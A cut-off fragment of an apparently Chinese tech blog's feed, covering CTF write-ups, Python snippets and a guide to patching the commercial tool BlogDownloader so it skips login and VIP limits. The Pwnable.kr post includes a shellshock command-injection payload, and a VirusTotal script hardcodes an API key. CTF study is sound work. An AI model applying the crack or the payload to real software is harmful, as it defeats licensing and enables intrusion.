+    <content type="html"><![CDATA[<p>文笔不好，路过的看官求勿喷。</p><p>官网下载程序，解压用dnspy来调试主程序BlogDownloader.exe;虽然被混淆，但这样的保护形同虚设，很容易通过动态调试被破解。<br><img src="http://t.cn/RVuofGm" alt=""></p><p>F5开始调试。<br><img src="http://t.cn/RVuoITs" alt=""></p><p>点击ok，程序会出现登陆框，要输入账号密码。第一步我们先实现免账号登陆，先随便输个账号密码，利用堆栈回溯来找到下图中高亮部分，这里面就是登陆流程部分。<br><img src="http://t.cn/RVuoMD5" alt=""></p><p>跳转到目标代码，很明显就是对账号密码的判断，我们只要将第一个判断语句的等于改成不等于，空账号登陆。</p><p><img src="http://t.cn/RVuoJ4G" alt=""><br><a id="more"></a><br>选中第一行if判断语句，右键编辑IL指令。<br><img src="http://t.cn/RVuoiQB" alt=""><br>再来看看修改后的语句，等于号已经换成不等于了。<br><img src="http://t.cn/RVuo6BW" alt=""></p><p>修改完成后，我们需要将我们修改的内容保存到文件。文件菜单中选保存模块或者保存所有来把修改后的文件保存到新文件。用这个文件替换原来的文件就ok了。</p><p>现在不需要账号就能使用了，但是还是有限制，只能下载5篇博客，</p><p>字符串搜索vip，找到如下结果。<br><img src="http://t.cn/RVuoSGH" alt=""></p><p>选中m_bVip 按下Ctrl+R,发现m_bVip在如下图地方被赋值，直接修改false为true,就没有只能下5篇博客的限制。<br><img src="http://t.cn/RVuoKeA" alt=""><br>同样是编辑il指令。<br><img src="http://t.cn/RVuooCA" alt=""></p><p>修改完成后保存到文件，注意此处属于BlogGather.dll文件的代码部分，用这个文件替换BlogGather.dll就可以去掉只能下载5篇博客的限制。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;文笔不好，路过的看官求勿喷。&lt;/p&gt;&lt;p&gt;官网下载程序，解压用dnspy来调试主程序BlogDownloader.exe;虽然被混淆，但这样的保护形同虚设，很容易通过动态调试被破解。&lt;br&gt;&lt;img src=&quot;http://t.cn/RVuofGm&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;F5开始调试。&lt;br&gt;&lt;img src=&quot;http://t.cn/RVuoITs&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;点击ok，程序会出现登陆框，要输入账号密码。第一步我们先实现免账号登陆，先随便输个账号密码，利用堆栈回溯来找到下图中高亮部分，这里面就是登陆流程部分。&lt;br&gt;&lt;img src=&quot;http://t.cn/RVuoMD5&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;跳转到目标代码，很明显就是对账号密码的判断，我们只要将第一个判断语句的等于改成不等于，空账号登陆。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://t.cn/RVuoJ4G&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>python selenium 3 + Firefox 48+ 报错解决方法</title>
+    <link href="http://yoursite.com/posts/e8a649b6.html"/>
+    <id>http://yoursite.com/posts/e8a649b6.html</id>
+    <published>2016-10-26T12:47:23.000Z</published>
+    <updated>2018-04-04T16:57:40.440Z</updated>
+    
+    <content type="html"><![CDATA[<p>这里记录下使用selenium碰到的问题。</p><p>报错信息如下时：</p><pre><code>selenium.common.exceptions.WebDriverException: Message: &#39;geckodriver&#39; executable needs to be in PATH.       </code></pre><p>这是因为在Firefox高版本需要使用 <strong>geckodriver</strong>来驱动,不再使用Seleniu默认自带的Firefox webdriver。</p><p>我们只需要在下面这个地址下载<strong>geckodriver</strong>并将 其所在的路径设为环境变量即可解决。</p><p><a href="https://github.com/mozilla/geckodriver/releases" target="_blank" rel="noopener">https://github.com/mozilla/geckodriver/releases</a></p><p>当报如下错误信息时，则是</p><pre><code>selenium.common.exceptions.WebDriverException: Message: Expected browser binary location, but unable to find binary in default location, no &#39;moz:firefoxOptions.binary&#39; capability provided, and no binary flag set on the command line</code></pre><p>这时我们需要指定Firefox浏览器程序路径。</p><pre><code class="python">binary = FirefoxBinary(&#39;D:\\Firefox\\Firefox\\firefox.exe&#39;)driver = webdriver.Firefox(firefox_binary=binary)</code></pre><p>这样就能正常使用了。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;这里记录下使用selenium碰到的问题。&lt;/p&gt;&lt;p&gt;报错信息如下时：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;selenium.common.exceptions.WebDriverException: Message: &amp;#39;geckodriver&amp;#39; executab
+      
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>pycharm 远程调试kodi python plugin</title>
+    <link href="http://yoursite.com/posts/8a11904.html"/>
+    <id>http://yoursite.com/posts/8a11904.html</id>
+    <published>2016-06-18T07:23:11.000Z</published>
+    <updated>2018-04-04T16:57:40.436Z</updated>
+    
+    <content type="html"><![CDATA[<p>kodi是什么我就不说了，附上一张我的kodi插件图。这个播放器最强大的功能就是支持python编写的插件。</p><p><img src="http://t.cn/R5Kc2nO" alt=""></p><p>但是有些老的插件作者已经不打算更新或维护了，使用的话又会有一些问题，这时就需要调试来修复问题了。<br>我最近使用的爱奇艺播放插件作者也是好久没更新，有了这个插件都不用去买爱奇艺VIP了，播放也没有广告。</p><a id="more"></a><p>官方教程是使用Eclipse来调试，但是这个并不是很好用。网上也没有相关的资料。<br><a href="kodi.wiki/view/How-to:Debug_Python_Scripts_with_Eclipse" title="Debug_Python_Scripts_with_Eclipse">Debug_Python_Scripts_with_Eclipse</a></p><p>这里我就介绍如何使用pycharm这款python IDE来远程调试Kodi python插件。</p><h2 id="pycharm安装pydevd"><a href="#pycharm安装pydevd" class="headerlink" title="pycharm安装pydevd"></a>pycharm安装pydevd</h2><p>pydevd是用来调试的模块，安装也比较简单，直接运行</p><pre><code>pip install pydevd</code></pre><p>或者使用pycharm安装</p><p>选择File → Setting → Project:Addons → Project:Interpreter 单击右边绿色的 + 号，在弹出的窗口输入<code>pydevd</code>单击下方的<code>install package</code>。</p><p><img src="http://t.cn/R5KcyQz" alt=""></p><h2 id="开始远程调试"><a href="#开始远程调试" class="headerlink" title="开始远程调试"></a>开始远程调试</h2><p>在开始调试前，我们还需要配置一些选项。</p><p>首先用pycharm打开kodi的插件目录，我的插件目录在<br><code>C:\Users\Ken\AppData\Roaming\Kodi\addons</code>,具体路径可能会因为版本和系统或其他的原因不同。<br><img src="http://t.cn/R5KcUFy" alt=""><br>文件夹名类似上图那就对了。</p><p>选择菜单Run → Edit Configurations打开下图窗口。单击绿色的 + 号 选择python remote debug。<br><img src="http://t.cn/R5Kcb4k" alt=""></p><p>把ip和端口设置好，这里我们需要将3处的代码粘贴到你想要断下的地方，这里3处的代码是</p><pre><code>pydevd.settrace(&#39;localhost&#39;, port=56789, stdoutToServer=True, stderrToServer=True)</code></pre><p>kodi自己并没有pydevd模块，也就是说我们必须自己从外部导入pydevd模块。在pycharm的debug-eggs文件夹有两个文件，这时用来调试的，如果是python3，则需要用<code>pycharm-debug-py3k.egg</code>,</p><p>将此文件添加至pythonpath然后导入pydevd。<br><img src="http://t.cn/R5KctKL" alt=""></p><p>开始调试，<br><img src="http://t.cn/R5Kc5c2" alt=""></p><p>在playvideo处设置了远程断点，当开始播放视频时断下。<br><img src="http://t.cn/R5KcGkK" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;kodi是什么我就不说了，附上一张我的kodi插件图。这个播放器最强大的功能就是支持python编写的插件。&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;http://t.cn/R5Kc2nO&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;但是有些老的插件作者已经不打算更新或维护了，使用的话又会有一些问题，这时就需要调试来修复问题了。&lt;br&gt;我最近使用的爱奇艺播放插件作者也是好久没更新，有了这个插件都不用去买爱奇艺VIP了，播放也没有广告。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Reversing.kr Flash Encrypt</title>
+    <link href="http://yoursite.com/posts/672ac0b8.html"/>
+    <id>http://yoursite.com/posts/672ac0b8.html</id>
+    <published>2016-04-09T03:37:51.000Z</published>
+    <updated>2018-04-04T16:57:40.425Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="http://t.cn/RqaVxsK" alt=""><br>一个swf文件，用浏览器或者播放器打开如上图。在编辑框输入正确的数值再按下按钮，编辑框和按钮会在另外一个位置出现，到最后输入正确的值会显示正确的key<br><img src="http://ww2.sinaimg.cn/large/005Afi4Gjw1f2yil169puj30fo082t8s.jpg" alt=""></p><p>我们使用ffdec来反编译这个swf文件，<br><img src="http://t.cn/RqaV6l4" alt=""></p><a id="more"></a><p>这个swf由很多个不同的frame组成，除了显示key的那个frame，每个frame都只有编辑框和按钮，只是位置不断变化。<br>鼠标选择对应的对象，在上方会显示相应的属性，如下图，我选中的按钮按钮名是<code>DefineButton2 (9)</code><br><img src="http://t.cn/RqaVSPB" alt=""></p><p>swf一般都是从frame1开始的，选中frame1，按钮名是<code>DefineButton2 (4)</code></p><p>来看<code>DefineButton2 (4)</code>的脚本代码<br><img src="http://t.cn/RqaVSgO" alt=""></p><p>这里有个spw变量，其实就是编辑框用来保存我们输入数据的变量。<br>frame1的编辑框对应的是<code>DefineEditText (6)</code>,变量是<code>spw</code>。如下图，<br><img src="http://t.cn/RqaVKJr" alt=""></p><p>这段代码<code>spw</code> 也就是我们输入的数据等于<code>1456</code>就会跳转到frame3执行。gotoandplay是跳转到某frame的函数。</p><p>frame3对应的按钮是<code>DefineButton2 (7)</code>，大家看到没，这里的变量变了，因为frame3的编辑框是用<code>spwd</code>来存储我们输入的数据不是<code>spw</code>,计算出的结果是</p><pre><code class="bash">spwd = 8 spw = 1456/8 = 182</code></pre><p><img src="http://t.cn/RqafPns" alt=""></p><p>后面也是一样，每次都输入正确的话key就会出来了。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;http://t.cn/RqaVxsK&quot; alt=&quot;&quot;&gt;&lt;br&gt;一个swf文件，用浏览器或者播放器打开如上图。在编辑框输入正确的数值再按下按钮，编辑框和按钮会在另外一个位置出现，到最后输入正确的值会显示正确的key&lt;br&gt;&lt;img src=&quot;http://ww2.sinaimg.cn/large/005Afi4Gjw1f2yil169puj30fo082t8s.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;我们使用ffdec来反编译这个swf文件，&lt;br&gt;&lt;img src=&quot;http://t.cn/RqaV6l4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="challenge" scheme="http://yoursite.com/categories/challenge/"/>
+    
+    
+      <category term="Reversing" scheme="http://yoursite.com/tags/Reversing/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Pwnable.kr shellshock</title>
+    <link href="http://yoursite.com/posts/8f13cc3.html"/>
+    <id>http://yoursite.com/posts/8f13cc3.html</id>
+    <published>2016-04-03T13:21:09.000Z</published>
+    <updated>2018-04-04T16:57:40.415Z</updated>
+    
+    <content type="html"><![CDATA[<p>这道题比较简单，对”破壳”漏洞了解的同学都能做出来。</p><pre><code class="c++">#include &lt;stdio.h&gt;                                                int main(){                                                               setresuid(getegid(), getegid(), getegid());                       setresgid(getegid(), getegid(), getegid());                       system(&quot;/home/shellshock/bash -c &#39;echo shock_me&#39;&quot;);               return 0;                                                 }                                                                 </code></pre><p>源码中调用了题目提供的有漏洞的bash,我们可以构造如下命令来打印出flag:</p><pre><code>    env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock</code></pre><p>上面这条命令相当于直接使用shellshcok调用的bash直接执行了<code>/bin/cat flag</code>,</p><pre><code class="bash">shellshock@ubuntu:~$ env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock    only if I knew CVE-2014-6271 ten years ago..!!                       Segmentation fault                                                   </code></pre><p>先了解这个漏洞的同学可以看看这两篇文章</p><p><a href="http://coolshell.cn/articles/11973.html" target="_blank" rel="noopener">bash代码注入的安全漏洞</a><br><a href="http://drops.wooyun.org/papers/3268" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;这道题比较简单，对”破壳”漏洞了解的同学都能做出来。&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;                                                
+int main(){
+      
+    
+    </summary>
+    
+      <category term="challenge" scheme="http://yoursite.com/categories/challenge/"/>
+    
+    
+      <category term="Pwnable" scheme="http://yoursite.com/tags/Pwnable/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>VirusTotal扫描器 python版</title>
+    <link href="http://yoursite.com/posts/62077d14.html"/>
+    <id>http://yoursite.com/posts/62077d14.html</id>
+    <published>2016-03-16T19:30:31.000Z</published>
+    <updated>2018-04-04T16:57:40.427Z</updated>
+    
+    <content type="html"><![CDATA[<p>利用在线查毒网站<a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a> 提供的API实现上传文件返回扫描结果，因为我平时只看查毒结果，因此只是简单的把文件上传然后返回分析结果。<br>代码如下：</p><a id="more"></a><pre><code class="python">#coding:gb2312from poster.encode import multipart_encode  # easy_install posterfrom poster.streaminghttp import register_openersimport urllib2,urllib,simplejson,sys,hashlib,osapikey = {&#39;apikey&#39;: &#39;fa07ea9eddbc8ef8d6e6c0b433030230f7785d3aca1da3dbdb19762455a82ad7&#39;}url = &#39;https://www.virustotal.com/vtapi/v2/file/&#39;virustotalAPI = {&#39;scan&#39;:url+&#39;scan&#39;,&#39;rescan&#39;:url+&#39;rescan&#39;,&#39;reports&#39;:url+&#39;report&#39;}def scan(filepath):    #发送post    register_openers()    file =  open(filepath, &quot;rb&quot;)    params = {&#39;file&#39;: file}    params.update(apikey)    datagen, headers = multipart_encode(params)    #计算文件的md5，先查询vt上是否有该样本，如果有直接返回结果，如果没有上传文件再返回结果    m2 = hashlib.md5()    m2.update(file.read())    json = report(m2.hexdigest())    if json[&#39;response_code&#39;] == 1:        reportformat(json)    else:        request = urllib2.Request(virustotalAPI[&#39;scan&#39;], datagen, headers)        result = simplejson.loads(urllib2.urlopen(request).read())        reportformat(report(result[&#39;resource&#39;]))def report(resource ):    parameters = {&quot;resource&quot;:resource}    parameters.update(apikey)    req  = urllib2.Request(virustotalAPI[&#39;reports&#39;], urllib.urlencode(parameters))    str = urllib2.urlopen(req).read()    if str == &#39;&#39;:        print &#39;获取扫描结果失败,请稍后再试&#39;        exit(1)    reportjson =  simplejson.loads(str)    return reportjsondef reportformat(json):    # 格式化输出返回的结果    if json[&#39;response_code&#39;] == 1:        print &#39;scan_date\t&#39; + json[&#39;scan_date&#39;]        print &#39;scan result %d/%d&#39;%(json[&#39;positives&#39;],json[&#39;total&#39;])        for u in json[&#39;scans&#39;]:            virus = json[&#39;scans&#39;][u]            print &#39;\t{0:&lt;20}\t{1:&lt;40}\t{2:&lt;10}&#39;.format(u,virus[&#39;result&#39;],virus[&#39;update&#39;])    else :        print &#39;请求的资源扫描未完成，请稍后再试&#39;def main(argv):  scan(argv[1])if __name__ == &#39;__main__&#39;:    main(sys.argv)</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;利用在线查毒网站&lt;a href=&quot;https://www.virustotal.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.virustotal.com/&lt;/a&gt; 提供的API实现上传文件返回扫描结果，因为我平时只看查毒结果，因此只是简单的把文件上传然后返回分析结果。&lt;br&gt;代码如下：&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>pycurl 分块下载</title>
+    <link href="http://yoursite.com/posts/6155f940.html"/>
+    <id>http://yoursite.com/posts/6155f940.html</id>
+    <published>2016-03-06T15:26:55.000Z</published>
+    <updated>2018-04-04T16:57:40.435Z</updated>
+    
+    <content type="html"><![CDATA[<p>写爬虫时要下载文件，谁知道文件比较大，然后在下载时候总是丢包，因此参考网上的一些源码写了实现分块下载的功能,有能力的童鞋可以自己改写成多线程的。<br>这个pycurl的分块下载功能我把它封装成了一个类，直接使用即可,接收5个参数,用法如下</p><pre><code class="python">    d = downloader(downloadurl,out_filePath,None,None,None)    d.download() #调用下载功能下载</code></pre><a id="more"></a><p>完整代码如下:</p><pre><code class="python">import pycurl# 设置curl对象 的proxy reffer cookiesdef SetOpt(target_address,proxy=None,reffer=None,cookies=None):        c = pycurl.Curl()        c.setopt(pycurl.URL,target_address)        if proxy != None:            c.setopt(pycurl.PROXY,proxy)    # 设置代理        if reffer != None:            c.setopt(pycurl.REFERER,reffer)        if cookies !=None:            c.setopt(pycurl.COOKIE,cookies)        return cclass downloader:    def __init__(self,target_address,out_filePath,reffer,cookies,proxy):        print out_filePath        self.output_file=out_filePath       # 输出路径        self.chunk=1*1024*1024              # 设置每次下载的块大小        #创建存放文件的目录        try:            self.dir_name=self.output_file+&quot;tmp&quot;            print self.dir_name            os.mkdir(self.dir_name)        except OSError:            pass        ######### 设置CURL对象 ######        self.curl_obj= SetOpt(target_address,reffer=reffer,cookies=cookies)        ## 临时的curl对象，用来获取文件的大小        tmp_curl_obj = SetOpt(target_address,reffer=reffer,cookies=cookies)         ##### 得到并设置下载文件的大小 ######        tmp_curl_obj.setopt(tmp_curl_obj.NOBODY,True)  #获取的文件内容不包含body部分        try:            print &quot;Trying to get size of the file&quot;            tmp_curl_obj.perform()            self.size = tmp_curl_obj.getinfo(tmp_curl_obj.CONTENT_LENGTH_DOWNLOAD) #文件大小            print  self.size        except Exception, e:            print e            self.delete_temp()            self.size = 0        #打印进度#        self.curl_obj.setopt(self.curl_obj.NOPROGRESS,1)        self.curl_obj.setopt(self.curl_obj.PROGRESSFUNCTION,self.progress)    ##### 下载 ######    def download(self):        if (self.size&gt;0):            print &quot;Starting download. Total size: &quot;+str(self.size)+&quot; bytes or &quot;+str(self.size/1024/1024)+&quot; MB&quot;            else:            print &quot;Starting download&quot;        #####  如果文件大小小于或等于块大小  就直接下载 不用分块了 #####        if self.size &lt;=self.chunk or self.size&lt;0:            self.curl_obj.fp = open(self.output_file, &quot;wb&quot;)            self.curl_obj.setopt(pycurl.WRITEDATA, self.curl_obj.fp)            self.curl_obj.perform()            self.curl_obj.fp.close()            return        #####  设置超时时间   #####        self.curl_obj.setopt(pycurl.TIMEOUT,60*10)        log=open(&quot;downloader.log&quot;,&quot;a&quot;)        # lim_l  块头 lim_u 块尾  如lim_l=0,lim_u=1023, 则这个块就是 0-1023        lim_l=0        lim_u=self.chunk  # 0 - 1M        i=1  #分块编号        ###### 下载文件  #####        while lim_l &lt; self.size :              temp_output=os.path.join(self.dir_name,&quot;output&quot;+str(i))            ###### 如果该分块已经存在且大小等于块大小1024*1024 说明该分块已经下载完成，继续下一次循环  #####            if os.path.exists(temp_output) and os.path.getsize(temp_output)==self.chunk:                #print &quot;skip chunk &quot;, i, lim_l                i=i+1                r=str(lim_l)+&quot;-&quot;+str(lim_u-1)  # 下载的文件分块范围 如 0-(1M-1)、 (1M-(2M-1))....                lim_l=lim_l+self.chunk                lim_u=lim_u+self.chunk                continue            #####  分块没有被下载则开始下载  #####            self.curl_obj.fp = open(temp_output, &quot;wb&quot;)            self.curl_obj.setopt(pycurl.WRITEDATA, self.curl_obj.fp)            r=str(lim_l)+&quot;-&quot;+str(lim_u-1)            self.curl_obj.setopt(pycurl.RANGE,r)            print &quot;download chunk&quot;, i            ##### 下载文件   #####            while True:                ##### 下载完成跳出这个循环  #####                try:                    self.curl_obj.perform()                    self.curl_obj.fp.close()                    break                ###### 异常则继续下载  #####                except pycurl.error, e:                    logmsg = &quot;Pycurl error caught &quot;+str(e)+&quot; while downloading at download range &quot;+str(r)+&quot; while storing to file &quot;+str(temp_output)+&quot;\n&quot;                    log.write(logmsg)                    print &quot;download {} exception&quot;.format(i)                    self.curl_obj.fp.close()                    self.curl_obj.fp=open(temp_output,&quot;wb&quot;)                    continue            i=i+1            lim_l=lim_l+self.chunk            lim_u=lim_u+self.chunk    ##### 删除下载的临时文件  #####    def delete_temp(self):        i=1        while True:            temp_output=os.path.join(self.dir_name,&quot;output&quot;+str(i))            if os.path.exists(temp_output):                os.remove(temp_output)            else:                break            i=i+1        try:            os.rmdir(self.dir_name)        except Exception, e:            pass    #####  合并文件  #####    def concatenate(self):        ##### 合并前清空output_file的内容   #####        fp=open(self.output_file,&#39;wb&#39;)        i=1        while True:            temp_output=os.path.join(self.dir_name,&quot;output&quot;+str(i))            if not os.path.exists(temp_output):                break            ##### 读取分块内容，依次附加到output_file  #####            print &quot;write chunk&quot;, i            tp=open(temp_output,&quot;rb&quot;)            buf = tp.read(1024 * 1024)            fp.write(buf)            tp.close()            i += 1        fp.close()    #打印进度    def progress(self,download_total,downloaded,uploaded_total,upload):        print &quot;To be downloaded&quot; + str(download_total)        print &quot;Downloaded : &quot; + str(downloaded)</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;写爬虫时要下载文件，谁知道文件比较大，然后在下载时候总是丢包，因此参考网上的一些源码写了实现分块下载的功能,有能力的童鞋可以自己改写成多线程的。&lt;br&gt;这个pycurl的分块下载功能我把它封装成了一个类，直接使用即可,接收5个参数,用法如下&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;    d = downloader(downloadurl,out_filePath,None,None,None)
+    d.download() #调用下载功能下载
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="python" scheme="http://yoursite.com/categories/python/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Reversing.kr Windows kernal</title>
+    <link href="http://yoursite.com/posts/2bf6b638.html"/>
+    <id>http://yoursite.com/posts/2bf6b638.html</id>
+    <published>2016-03-06T03:21:40.000Z</published>
+    <updated>2018-04-04T16:57:40.426Z</updated>
+    
+    <content type="html"><![CDATA[<p>运行程序看看，要输入数据之前要先点击按钮Enable<br><img src="http://t.cn/RGQPldt" alt=""><br>然后按钮变成Check，这时就可以输入字符，输入正确的字符就会弹出正确的提示。<br><img src="http://t.cn/RGQPYcX" alt=""><br><a id="more"></a><br>用IDA载入程序，在sub_401110函数中就是对输入字符串判断的关键函数。<br><img src="http://t.cn/RGQPTGH" alt=""><br>来到关键call，这段代码是用户模式下的程序与驱动进行交互。对字符串验证的逻辑肯定是在驱动文件里了。<br><img src="http://t.cn/RGQPHAF" alt=""></p><p>IDA载入驱动文件分析驱动<br><img src="http://t.cn/RGQPQLd" alt=""></p><p>注册了两个派遣例程，sub_11288 函数是DeviceIoControl，处理用户模式与该驱动的交互。</p><p>这里我们可以看到这里处理DeviceIoControlCode 为 0x1000 和 0x2000。再看前面sub_401110函数的代码，我们可以知道<br>程序刚开始运行时，编辑框不能输入任何数据，点击Enable,发送0x1000到驱动，按钮变成check,编辑框就能用了，这时就可以输入字符了。<br>再点击check，就发送0x2000到驱动验证结果对不对。</p><p>sub_112F8函数代码<br><img src="http://t.cn/RGQhP35" alt=""></p><p>驱动还使用KeInitializeDpc函数注册了一个定时器，每隔一段时间就运行sub_11266函数。<br>在这个函数里，看到一个函数 READ_PORT_UCHAR，这个函数通过端口号来读取输入的字节。然后在下面的这个函数sub_111DC中验证，<br><img src="http://t.cn/RGQGHdX" alt=""></p><p>既然验证代码在内核中，那我们就需要用winDBG来调试驱动了。<br>在WinDBG中使用lm命令查找所有加载的模块。WinKer就是我们程序加载的驱动。<br><img src="http://t.cn/RGQPRcM" alt=""></p><p>用!drvobj WinKer命令来看 WinKer驱动的信息。<br><img src="http://t.cn/RGQPEOr" alt=""><br>下面列出了个设备对象列表，点击87bc0650，你也可以手动输入命令!devobj 87bc0650。<br>这里这个驱动对象的地址是87bc0780，找到了驱动对象的地址，我们就可以使用dt来查看它的数据结构了。<br><img src="http://t.cn/RGQh7iL" alt=""></p><p>还记得前面说的sub_11288函数的三个派遣函数么，派遣函数的地址存放在MajorFunction数组了，我们可以通过这个地址找到对于的函数，来进行调试。</p><p>sub_11288 为MajorFunction第e个数组，因此可以通过计算87bc0780+0x38+0xe*4得到改内存的值知道这个函数的内存地址为93316288。<br><img src="http://t.cn/RGQhzqI" alt=""></p><p>前面我们已经知道 验证代码在sub_11266(00011266)函数处，通过计算可以知道该函数在内存中的地址 93316288-11288 + 00011166 = 933161DC66 。这个函数就是验证地方。在这个地方下断就可以调试了。<br>不过有一个问题就是 在程序编辑框输入数据后这里会被断下两次,由此可知没输入一个字符，调用两次这个函数。</p><p>通过 READ_PORT_UCHAR函数读取用户输入的数据。READ_PORT_UCHAR每一次只读取一个字节，而g_var变量也在随着变化，分析流程图我们可以得知g_var全局变量为输入字符在字符串的位置。READ_PORT_UCHAR读取从0到3位 返回的值分别是 0xa5u,0x92u,0x95u,0xbu<br><img src="http://t.cn/RGQhnkB" alt=""><br>当等于7是g_var+100= 107，没有这个分支，进入默认分支进入sub_11156函数。<br><img src="http://t.cn/RGQ7j3U" alt=""><br>同上类似，READ_PORT_UCHAR读取的是从4到6位,返回的值分别是：0xb2u，0x85u，0xa3u。 g_var值变成200，第三个swith同样。<br><img src="http://t.cn/RGQ7TVT" alt=""></p><p>只要将你输入的字符和READ_PORT_UCHAR返回的字符对应起来，就可以得到正确的key。要知道READ_PORT_UCHAR的返回值,还是得用winDBG来调试。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;运行程序看看，要输入数据之前要先点击按钮Enable&lt;br&gt;&lt;img src=&quot;http://t.cn/RGQPldt&quot; alt=&quot;&quot;&gt;&lt;br&gt;然后按钮变成Check，这时就可以输入字符，输入正确的字符就会弹出正确的提示。&lt;br&gt;&lt;img src=&quot;http://t.cn/RGQPYcX&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Pwnable.kr leg</title>
+    <link href="http://yoursite.com/posts/c240cede.html"/>
+    <id>http://yoursite.com/posts/c240cede.html</id>
+    <published>2016-02-15T09:10:06.000Z</published>
+    <updated>2018-04-04T16:57:40.411Z</updated>
+    
+    <content type="html"><![CDATA[<p>先看题目提供的源码；<br><img src="http://t.cn/RGROoB4" alt=""></p><p>分析后知道只要我们输入的key等于key()、key2()和key3()的值的和就能得到flag。</p><pre><code class="cpp">key1()+key2()+key3()) == key </code></pre><a id="more"></a><p>这三个函数都是内嵌的汇编。我们在来看题目提供的 gdb反汇编的代码。</p><p><strong>key1()</strong></p><pre><code class="bash">(gdb) disass key1                                                              Dump of assembler code for function key1:                                         0x00008cd4 &lt;+0&gt;:     push    {r11}           ; (str r11, [sp, #-4]!)           0x00008cd8 &lt;+4&gt;:     add     r11, sp, #0                                       0x00008cdc &lt;+8&gt;:     mov     r3, pc                                            0x00008ce0 &lt;+12&gt;:    mov     r0, r3                                            0x00008ce4 &lt;+16&gt;:    sub     sp, r11, #0                                       0x00008ce8 &lt;+20&gt;:    pop     {r11}           ; (ldr r11, [sp], #4)             0x00008cec &lt;+24&gt;:    bx      lr                                             End of assembler dump.                                                         </code></pre><p>关键部分：</p><pre><code class="bash">   0x00008cdc &lt;+8&gt;:     mov     r3, pc                                            0x00008ce0 &lt;+12&gt;:    mov     r0, r3 </code></pre><p>arm汇编是以r0作为函数的返回值的，pc的值为当前地址+8 即0x00008cdc+ 8</p><p><strong>key2()</strong></p><pre><code class="bash">(gdb) disass key2                                                           Dump of assembler code for function key2:                                      0x00008cf0 &lt;+0&gt;:     push    {r11}           ; (str r11, [sp, #-4]!)        0x00008cf4 &lt;+4&gt;:     add     r11, sp, #0                                    0x00008cf8 &lt;+8&gt;:     push    {r6}            ; (str r6, [sp, #-4]!)         0x00008cfc &lt;+12&gt;:    add     r6, pc, #1                                     0x00008d00 &lt;+16&gt;:    bx      r6                                             0x00008d04 &lt;+20&gt;:    mov     r3, pc                                         0x00008d06 &lt;+22&gt;:    adds    r3, #4                                         0x00008d08 &lt;+24&gt;:    push    {r3}                                           0x00008d0a &lt;+26&gt;:    pop     {pc}                                           0x00008d0c &lt;+28&gt;:    pop     {r6}            ; (ldr r6, [sp], #4)           0x00008d10 &lt;+32&gt;:    mov     r0, r3                                         0x00008d14 &lt;+36&gt;:    sub     sp, r11, #0                                    0x00008d18 &lt;+40&gt;:    pop     {r11}           ; (ldr r11, [sp], #4)          0x00008d1c &lt;+44&gt;:    bx      lr                                          End of assembler dump.                                                      </code></pre><p>关键部分：</p><pre><code class="bash">   0x00008d00 &lt;+16&gt;:    bx      r6                                             0x00008d04 &lt;+20&gt;:    mov     r3, pc                                         0x00008d06 &lt;+22&gt;:    adds    r3, #4      ......   0x00008d10  &lt;+32&gt;:   mov r0, r3          </code></pre><p>r6 = 0x00008cfc + 8 +1 = 0x00008d04。 bx r6在r6地址处切换成thumb模式。在thumb模式下pc = 当前地址+4。r0 =r3 = 0x00008d04 +4+4</p><p><strong>key3()</strong></p><pre><code class="bash">(gdb) disass key3                                                             Dump of assembler code for function key3:                                        0x00008d20 &lt;+0&gt;:     push    {r11}           ; (str r11, [sp, #-4]!)          0x00008d24 &lt;+4&gt;:     add     r11, sp, #0                                      0x00008d28 &lt;+8&gt;:     mov     r3, lr                                           0x00008d2c &lt;+12&gt;:    mov     r0, r3                                           0x00008d30 &lt;+16&gt;:    sub     sp, r11, #0                                      0x00008d34 &lt;+20&gt;:    pop     {r11}           ; (ldr r11, [sp], #4)            0x00008d38 &lt;+24&gt;:    bx      lr                                            End of assembler dump.                                                        </code></pre><p>关键部分</p><pre><code class="bash">   0x00008d28 &lt;+8&gt;:     mov     r3, lr                                           0x00008d2c 